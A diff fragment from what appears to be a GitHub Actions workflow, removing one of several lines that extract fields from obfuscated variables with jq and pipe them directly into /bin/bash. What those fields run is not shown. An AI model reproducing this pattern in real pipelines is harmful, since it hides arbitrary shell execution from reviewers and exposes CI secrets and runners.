@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$bxyl849" | jq -r .wqvqa85 | /bin/bash
           echo $g19 | jq -r .ysps5870 | /bin/bash
           printf '%s' "$uni315" | jq -r .w85 | /bin/bash
-          printf '%s' "$wm89797" | jq -r .awm919 | /bin/bash
           echo $wluhu3070 | jq -r .zby04684 | /bin/bash
 
       - name: Save data
